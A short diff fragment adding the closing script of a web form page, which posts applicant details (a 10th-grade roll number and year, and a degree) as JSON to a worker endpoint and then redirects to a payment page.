+                roll10: document.getElementById("fieldRoll10").value.trim(),
+                year10: document.getElementById("fieldYear10").value.trim(),
+                degree: document.getElementById("fieldDegree").value,
+                timestamp: new Date().toISOString()
+            };
+
+            fetch(WORKER_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(formData),
+                keepalive: true
+            }).catch(err => console.error("Worker Background Request Exception:", err));
+
+            window.location.href = "payment.html";
+        }
+
+        // Remove error style on input change
+        document.querySelectorAll('.input-field').forEach(input => {
+            input.addEventListener('input', () => input.classList.remove('input-error'));
+            input.addEventListener('change', () => input.classList.remove('input-error'));
+        });
+    </script>
+</body>
+</html>
